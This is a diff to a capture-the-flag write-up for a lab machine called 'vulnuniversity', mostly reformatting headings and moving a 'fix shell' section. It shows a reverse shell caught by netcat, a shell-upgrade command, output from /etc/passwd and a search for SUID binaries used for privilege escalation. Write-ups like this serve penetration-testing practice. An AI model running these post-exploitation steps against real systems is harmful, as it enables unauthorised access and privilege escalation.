@@ -160,7 +160,7 @@ To gain remote access to this machine, follow these steps:
 
 5. You should see a connection on your netcat session
 
-Success reversed shell
+Success reversed shell ✅
 
 ```
 Listening on 0.0.0.0 4444
@@ -174,8 +174,11 @@ $ whoami
 www-data
 ```
 
+Fix shell:
+
 ```
-$ cat /etc/passwd
+$ /usr/bin/script -qc /bin/bash /dev/null
+www-data@vulnuniversity:/$
 ```
 
 ```
@@ -213,7 +216,7 @@ ftp:x:111:119:ftp daemon,,,:/srv/ftp:/bin/false
 bill:x:1000:1000:,,,:/home/bill:/bin/bash
 ```
 
-User flag:
+##### User flag:
 
 ```
 $ cd /home/bill	
@@ -244,16 +247,7 @@ find / -type f -perm -4000
 /bin/fusermount
 ```
 
-
-Fix shell:
-
-```
-$ /usr/bin/script -qc /bin/bash /dev/null
-www-data@vulnuniversity:/$
-```
-
-
-Root flag:
+##### Root flag:
 ```
 www-data@vulnuniversity:/$ cat /root/root.txt
 cat: /root/root.txt: Permission denied
